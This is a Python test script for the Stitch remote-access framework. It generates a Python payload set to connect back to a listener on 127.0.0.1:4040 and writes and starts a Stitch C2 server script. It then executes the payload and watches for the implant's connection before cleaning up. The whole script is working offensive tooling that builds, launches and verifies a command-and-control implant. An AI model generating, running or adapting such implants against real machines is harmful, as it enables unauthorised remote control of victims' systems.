#!/usr/bin/env python3
"""
Real test - generate payload, start server, execute payload, verify connection
"""

import os
import sys
import time
import subprocess
import threading
import socket

sys.path.insert(0, '/workspace')
os.environ['PATH'] = os.environ.get('PATH', '') + ':/home/ubuntu/.local/bin'

print("="*70)
print("REAL PAYLOAD CONNECTION TEST")
print("="*70)

# Step 1: Generate a Python payload for testing
print("\n[1] Generating Python payload...")
from web_payload_generator import web_payload_gen

config = {
    'bind_host': '',
    'bind_port': '',
    'listen_host': '127.0.0.1',
    'listen_port': '4040',
    'enable_bind': False,
    'enable_listen': True,
    'platform': 'python',  # Explicitly request Python
    'payload_name': 'test_connect'
}

result = web_payload_gen.generate_payload(config)
if not result['success']:
    print(f"[-] Failed: {result['message']}")
    sys.exit(1)

payload_path = result['payload_path']
print(f"[+] Generated: {payload_path}")

# Step 2: Start the Stitch server
print("\n[2] Starting Stitch C2 server on port 4040...")
server_script = """
import sys
import os
import time
sys.path.insert(0, '/workspace')

from Application.stitch_cmd import stitch_server

server = stitch_server()
server.do_listen('4040')
print("[Server] Listening on port 4040...")

# Monitor for connections
while True:
    time.sleep(2)
    if server.inf_sock:
        for ip in server.inf_sock.keys():
            print(f"[Server] Connection from: {ip}")
    else:
        print("[Server] No connections yet...")
"""

with open('/tmp/server.py', 'w') as f:
    f.write(server_script)

server_proc = subprocess.Popen(
    ['python3', '/tmp/server.py'],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1
)

# Monitor server output in background
def monitor_server():
    for line in server_proc.stdout:
        print(f"  {line.strip()}")

server_thread = threading.Thread(target=monitor_server, daemon=True)
server_thread.start()

time.sleep(3)

# Verify server is listening
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if sock.connect_ex(('127.0.0.1', 4040)) == 0:
    print("[+] Server listening confirmed")
    sock.close()
else:
    print("[-] Server not listening!")
    server_proc.terminate()
    sys.exit(1)

# Step 3: Execute the payload
print("\n[3] Executing payload...")
print(f"    Path: {payload_path}")

# Check what kind of file it is
with open(payload_path, 'rb') as f:
    header = f.read(20)
    
if b'python' in header.lower() or b'from' in header or payload_path.endswith('.py'):
    print("    Type: Python script")
    payload_proc = subprocess.Popen(
        ['python3', payload_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
else:
    print("    Type: Binary executable")
    os.chmod(payload_path, 0o755)
    payload_proc = subprocess.Popen(
        [payload_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

print(f"[+] Payload started (PID: {payload_proc.pid})")

# Step 4: Wait for connection
print("\n[4] Waiting for payload to connect...")
time.sleep(5)

# Check if payload is still running
if payload_proc.poll() is not None:
    stdout, stderr = payload_proc.communicate()
    print("[-] Payload exited!")
    print(f"    stdout: {stdout.decode()[:200] if stdout else 'None'}")
    print(f"    stderr: {stderr.decode()[:200] if stderr else 'None'}")
else:
    print("[+] Payload still running")

# Step 5: Check for connections
print("\n[5] Checking connections...")
time.sleep(3)

# The server thread should have printed connection info
print("\n[*] Test complete. Check server output above for connections.")

# Cleanup
print("\n[6] Cleaning up...")
payload_proc.terminate()
server_proc.terminate()

try:
    payload_proc.wait(timeout=2)
    server_proc.wait(timeout=2)
except:
    payload_proc.kill()
    server_proc.kill()

print("[+] Done")